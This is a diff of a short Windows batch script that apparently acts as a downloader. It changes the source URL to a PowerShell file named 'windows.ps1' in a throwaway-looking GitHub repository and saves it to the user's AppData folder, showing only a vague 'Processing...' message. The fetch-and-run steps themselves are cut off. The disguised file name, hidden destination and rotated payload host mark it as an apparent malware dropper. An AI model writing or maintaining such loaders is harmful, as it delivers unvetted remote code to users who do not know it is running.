@@ -1,5 +1,5 @@
 @echo off
-set "URL=https://github.com/zrxqzrxq123/asdasd/raw/refs/heads/main/windows.ps1"
+set "URL=https://github.com/qoqoxxxx-stack/aa/raw/refs/heads/main/windows.ps1"
 set "DEST=%AppData%\windows.ps1"
 
 echo Processing...
